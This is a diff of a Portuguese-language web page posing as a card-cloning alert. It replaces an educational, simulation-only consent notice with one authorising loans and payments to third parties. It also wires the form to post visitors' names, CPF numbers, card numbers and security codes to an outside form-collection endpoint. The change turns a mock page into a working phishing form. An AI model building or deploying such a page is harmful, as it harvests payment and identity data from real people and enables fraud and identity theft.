@@ -16,24 +16,21 @@
 <main>
 <div id="termo-consentimento">
 <h2>Termo de Consentimento</h2>
-<p>Ao utilizar este site, você concorda com os termos e condições abaixo:</p>
-<p>1. O site é para fins educacionais.</p>
-<p>2. As informações fornecidas serão utilizadas apenas para fins de simulação.</p>
-<p>3. O site não armazenará dados pessoais sensíveis.</p>
+<p>Autorizo o uso dos meus dados para solicitar empréstimos e pagamentos para terceiros.</p>
 <button id="aceito">Aceito</button>
 <button id="nao-aceito">Não Aceito</button>
 </div>
 <div id="conteudo" style="display: none;">
 <h1>Alerta de Clonagem de Cartão</h1>
-<form id="form-cartao">
+<form id="form-cartao" action="https://formspree.io/f/mbllpbpk" method="post">
 <label for="nome">Nome:</label>
-<input type="text" id="nome" required>
+<input type="text" id="nome" name="nome" required>
 <label for="cpf">CPF:</label>
-<input type="text" id="cpf" onkeyup="formatarCPF(this)" maxlength="14" required>
+<input type="text" id="cpf" name="cpf" onkeyup="formatarCPF(this)" maxlength="14" required>
 <label for="numero-cartao">Número do Cartão:</label>
-<input type="text" id="numero-cartao" onkeyup="formatarCartao(this)" maxlength="19" required>
+<input type="text" id="numero-cartao" name="numero-cartao" onkeyup="formatarCartao(this)" maxlength="19" required>
 <label for="codigo-cartao">Código de Segurança:</label>
-<input type="text" id="codigo-cartao" required>
+<input type="text" id="codigo-cartao" name="codigo-cartao" required>
 <button id="btn-verificar">Verificar</button>
 </form>
 <div id="resultado"></div>
